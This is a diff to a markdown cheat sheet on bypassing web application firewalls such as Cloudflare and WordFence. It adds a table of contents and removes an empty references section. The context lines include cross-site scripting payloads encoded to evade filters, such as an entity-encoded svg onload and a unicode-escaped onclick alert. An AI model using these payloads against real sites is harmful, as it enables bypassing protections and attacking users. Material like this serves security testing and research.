@@ -1,5 +1,14 @@
 # Common WAF Bypass
 
+## Summary
+
+* [Cloudflare](#cloudflare)
+* [Chrome Auditor](#chrome-auditor)
+* [Incapsula WAF](#incapsula-waf)
+* [Akamai WAF](#akamai-waf)
+* [WordFence WAF](#wordfence-waf)
+* [Fortiweb WAF](#fortiweb-waf)
+
 ## Cloudflare
 
 * 25st January 2021 - [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)
@@ -34,7 +43,6 @@
     ```js
     <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
     ```
-
 
 * 27th February 2018
     ```html
@@ -83,7 +91,7 @@ NOTE: Chrome Auditor is deprecated and removed on latest version of Chrome and C
     ```
 
 
-## WordFence WAF 
+## WordFence WAF
 
 * 12th September 2018 - [@brutelogic](https://twitter.com/brutelogic)
     ```html
@@ -96,8 +104,3 @@ NOTE: Chrome Auditor is deprecated and removed on latest version of Chrome and C
     ```javascript
     \u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
     ```
-
-
-## References
-
-* [TODO](TODO)
